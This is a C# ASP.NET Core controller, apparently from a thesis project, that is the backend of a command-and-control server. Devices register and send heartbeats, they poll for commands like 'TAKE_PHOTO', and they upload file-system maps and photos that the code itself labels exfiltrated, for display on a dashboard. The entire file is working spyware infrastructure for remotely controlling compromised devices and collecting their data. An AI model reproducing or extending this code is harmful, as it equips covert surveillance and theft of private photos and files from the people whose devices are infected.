using Microsoft.AspNetCore.Mvc;
using tesis.DTOs;
using tesis.Models;
using tesis.Services;

namespace tesis.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class DevicesController : ControllerBase
    {
        private readonly C2Service _c2Service;

        public DevicesController(C2Service c2Service)
        {
            _c2Service = c2Service;
        }

        // POST: api/devices/register
        [HttpPost("register")]
        public async Task<IActionResult> Register([FromBody] RegisterDeviceDto dto)
        {
            // Capturamos la IP real de la petición
            var ip = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";

            await _c2Service.RegisterDeviceAsync(dto, ip);
            return Ok(new { message = "Dispositivo registrado/actualizado" });
        }

        // POST: api/devices/heartbeat
        [HttpPost("heartbeat")]
        public async Task<IActionResult> Heartbeat([FromBody] HeartbeatDto dto)
        {
            await _c2Service.UpdateHeartbeatAsync(dto.DeviceId);
            return Ok(new { status = "alive" });
        }

        // GET: api/devices/{id}/commands
        [HttpGet("{id}/commands")]
        public async Task<IActionResult> GetCommands(string id)
        {
            var commands = await _c2Service.GetPendingCommandsAsync(id);
            return Ok(commands); // Devuelve array JSON: [{"command": "TAKE_PHOTO", "id": 5}]
        }

        // POST: api/devices/upload-photo
        // Acepta Multipart/Form-Data
        // GET: api/devices/{id}/files
        [HttpGet("{id}/files")]
        public async Task<IActionResult> GetDeviceFiles(string id)
        {
            // Llamamos al servicio para obtener los archivos de la DB
            var files = await _c2Service.GetFilesByDeviceAsync(id);

            if (files == null || !files.Any())
                return NotFound("No se encontraron archivos para este dispositivo.");

            return Ok(files); // Retorna el JSON para Angular
        }
        // POST: api/devices/file-list
        [HttpPost("file-list")]
        public async Task<IActionResult> ReceiveFileList([FromBody] FileListDto dto)
        {
            // 1. Validar que el dispositivo existe
            if (string.IsNullOrEmpty(dto.deviceId))
                return BadRequest("El DeviceId es obligatorio.");

            // 2. Procesar la lista de archivos a través del servicio
            // Este método guardará la estructura en tu base de datos MySQL
            var success = await _c2Service.UpdateDeviceFileMapAsync(dto);

            if (!success)
                return NotFound("Dispositivo no encontrado en la base de datos.");

            return Ok(new { message = "Estructura de archivos actualizada correctamente" });
        }
        // EN: DevicesController.cs
        // ... dentro de DevicesController.cs

        // DELETE: api/devices/{id}/photos
        [HttpDelete("{id}/photos")]
        public async Task<IActionResult> DeletePhotos(string id)
        {
            var result = await _c2Service.DeleteAllPhotosAsync(id);

            if (!result)
            {
                return NotFound(new { message = "No se encontraron fotos para eliminar o el dispositivo no existe." });
            }

            return Ok(new { message = "Todas las fotos han sido eliminadas correctamente." });
        }
        // En AdminController.cs
        [HttpGet("health")]
        public IActionResult HealthCheck()
        {
            // Solo responde OK, no gasta recursos
            return Ok(new { status = "Online", time = DateTime.Now });
        }

        [HttpPost("get-photos")]
        public async Task<IActionResult> GetPhotos([FromBody] HeartbeatDto dto)
        {
            if (string.IsNullOrEmpty(dto.DeviceId))
                return BadRequest("DeviceId es requerido");

            // OJO AQUÍ: Tienes que llamar a 'GetExfiltratedPhotosAsync', 
            // NO a 'GetFilesByDeviceAsync'.
            var files = await _c2Service.GetExfiltratedPhotosAsync(dto.DeviceId);

            // ✅ Solución: Creamos una lista vacía DE FOTOS, no de objetos genéricos.
            return Ok(files ?? new List<ExfiltratedPhoto>());
        }
        // POST: api/devices/upload-photo
        [HttpPost("upload-photo")]
        public async Task<IActionResult> UploadPhoto([FromForm] PhotoUploadDto dto)
        {
            // Validaciones básicas
            if (dto.File == null || dto.File.Length == 0)
                return BadRequest("No se envió ningún archivo.");

            if (string.IsNullOrEmpty(dto.DeviceId))
                return BadRequest("Falta el Device ID.");

            // Llamamos al servicio desglosando el DTO
            var success = await _c2Service.SaveExfiltratedPhotoAsync(dto.DeviceId, dto.File);

            if (!success)
                return BadRequest("Error al guardar la foto o dispositivo no encontrado.");

            return Ok(new { message = "Evidencia guardada exitosamente" });
        }
    }
}